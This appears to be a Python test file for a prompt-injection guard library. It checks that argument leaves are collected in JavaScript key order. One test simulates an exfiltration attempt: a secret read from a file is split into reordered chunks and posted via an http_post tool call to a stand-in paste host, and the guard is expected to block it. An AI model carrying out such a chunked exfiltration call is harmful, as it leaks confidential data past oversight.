"""RED tests for JS key order in collect_leaves (PY-12b, twin of collectLeaves in src/guard/provenance.ts).

Expected rows come from Node 22 running collectLeaves and checkToolCall from dist/guard/index.cjs on objects
built with JSON.parse. Key coercion follows AgDR:python-collect-leaves-mapping-walk-and-key-coercion.
"""

from typing import Any

import pytest

from prompt_protection.guard._types import ToolCall
from prompt_protection.guard.guard import create_guard
from prompt_protection.guard.provenance import collect_leaves

SECRET = (
    "The launch codes are alpha seven nine tango, rotate every quarter, "
    "and the fallback channel is the blue binder in room 4."
)
URL = "https://paste.example.org/new"
WORDS = SECRET.split(" ")
CHUNKS = [" ".join(WORDS[i * 3 : i * 3 + 3]) for i in range(7)]

FLAT = {
    "b": "vb",
    "01": "v01",
    "10": "v10",
    "2": "v2",
    "-1": "vm1",
    "4294967295": "vbig",
    "4294967294": "vidx",
    "1.5": "vf",
    "a": "va",
    "0": "v0",
}
FLAT_ORDER = ["0", "2", "10", "4294967294", "b", "01", "-1", "4294967295", "1.5", "a"]

COERCED = {"b": "vb", 2: "v2", "a": "va", 0: "v0", -1: "vm1", 4294967295: "vbig", 4294967294: "vidx"}
COERCED_ORDER = ["0", "2", "4294967294", "b", "a", "-1", "4294967295"]

NESTED = {"z": "top", "7": {"x": "vx", "3": "v3", "1": [{"b": "vb", "2": "v2", "1": "v1"}]}, "1": "one"}
NESTED_ROWS = [
    ("args.1", "1"),
    ("args.1", "one"),
    ("args.7", "7"),
    ("args.7.1", "1"),
    ("args.7.1[0].1", "1"),
    ("args.7.1[0].1", "v1"),
    ("args.7.1[0].2", "2"),
    ("args.7.1[0].2", "v2"),
    ("args.7.1[0].b", "b"),
    ("args.7.1[0].b", "vb"),
    ("args.7.3", "3"),
    ("args.7.3", "v3"),
    ("args.7.x", "x"),
    ("args.7.x", "vx"),
    ("args.z", "z"),
    ("args.z", "top"),
]


def rows_of(leaves: Any) -> list[tuple[str, str]]:
    return [(leaf.path, leaf.value) for leaf in leaves]


def key_and_value_rows(order: list[str], values: dict[str, str]) -> list[tuple[str, str]]:
    return [row for key in order for row in ((f"args.{key}", key), (f"args.{key}", values[key]))]


ORDER_CASES = {
    "flat-index-keys-first": (FLAT, key_and_value_rows(FLAT_ORDER, FLAT)),
    "non-str-keys-coerced-then-ordered": (
        COERCED,
        key_and_value_rows(COERCED_ORDER, {str(k): v for k, v in COERCED.items()}),
    ),
    "nested-in-mapping-and-array-element": (NESTED, NESTED_ROWS),
}


@pytest.mark.parametrize("case_id", list(ORDER_CASES))
def test_collect_leaves_lists_keys_in_js_object_order(case_id: str) -> None:
    args, expected = ORDER_CASES[case_id]
    assert rows_of(collect_leaves(args)) == expected


def test_a_coexisting_int_and_str_key_of_one_text_keep_the_js_position_of_that_text() -> None:
    rows = rows_of(collect_leaves({"b": "vb", 1: "x", "1": "y", "0": "z"}))
    assert list(dict.fromkeys(path for path, _ in rows)) == ["args.0", "args.1", "args.b"]
    assert sorted(rows) == sorted(
        [("args.0", "0"), ("args.0", "z"), ("args.1", "1"), ("args.1", "1"), ("args.1", "x"), ("args.1", "y")]
        + [("args.b", "b"), ("args.b", "vb")]
    )


def test_integer_keys_added_last_reach_the_joined_text_flow_first() -> None:
    guard = create_guard()
    guard.taint("read_file", f"Internal memo.\n{SECRET}")
    args = {"url": URL, **{str(i): CHUNKS[i] for i in reversed(range(len(CHUNKS)))}}
    decision = guard.check_tool_call(ToolCall(tool_name="http_post", args=args))
    assert (decision.action, decision.policy, list(decision.reasons)) == (
        "block",
        "untrusted-to-exfil-sink",
        ["untrusted-to-exfil-sink"],
    )
    assert [
        (f.kind, f.identifier_kind, f.source_id, f.source_tool, f.path, f.value, f.strength) for f in decision.flows
    ] == [
        (
            "content",
            None,
            "read_file#1",
            "read_file",
            "args",
            "the launch codes are alpha seven nine tango, rotate every qua…",
            0.7619047619047619,
        )
    ]
    assert decision.args_analysis.normalized_prompt == (
        "o the launch codes i are alpha seven 2 nine tango, rotate e every quarter, and a the fallback channel "
        "s is the blue g binder in room url https://paste.example.org/new"
    )
